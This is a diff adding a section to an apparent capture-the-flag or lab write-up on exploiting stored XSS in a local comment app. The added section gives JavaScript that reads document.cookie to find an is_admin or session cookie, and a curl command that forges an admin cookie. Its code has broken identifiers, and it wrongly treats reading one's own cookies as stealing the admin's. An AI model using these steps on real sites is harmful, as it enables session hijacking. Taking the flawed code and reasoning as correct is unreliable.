@@ -24,4 +24,42 @@ then in the given filenames the flag may be stored so by googling we can get som
 by doing soo we can get upto the flag
 
 XSS(my approach):
+first after login we see a comment box where you can comment things now the comments which you type is only shown to you but there are some users with some extra privilages who can see all the users comments 
+now one of the privaleged user is admin so now we can get the admin cookie and can also get the privilages as th admin by changing our cookies ot the admin cookie
+we try sqli,xss,command injection  but xss works so this website have xss vulnerbility 
+now we have to get the value of the cookie we see the storage section there a cookie is_admin is set to know now to conform and check the value of the is_admin cookie for the admin we use js 
+function checkAdminCookie() {
+    const cookies = document.cookie.split(';');
+    for (const cookie of cookies) {
+        const [name, value] = cookie.trim().split('=');
+        if (name === 'is_admin' && value === 'yes') {
+            return true;
+        }
+    }
+    return false;
+}
+if (checkAdminCookie()) {
+    alert('Admin cookie found!');
+} else {
+    alert('Admin cookie not found.');
+}
+ or
+ 
+function getUser Cookies() {
+    const cookies = document.cookie.split(';');
+    const userCookies = {};
+    cookies.forEach(cookie => {
+        const [name, value] = cookie.trim().split('=');
+        if (name.startsWith('user_') || name === 'session_id') {
+            userCookies[name] = decodeURIComponent(value);
+        }
+    });
 
+    return userCookies;
+}
+const loggedInUser Cookies = getUser Cookies();
+console.log(loggedInUser Cookies);
+
+we get the values of the cookies if the pop box say admin cookie found means that is the cookie for the admin and it also specifies the value of the admin cookie(yes)
+by this way we are stealing the cookies from the admin
+now if we change the is_admin value of our cookie manually or by terminal(curl -v -b "cookie_name=cookie_value" http://localhost/xss_damn/some_endpoint.php) we get the admin privilages i.e to see all the comments
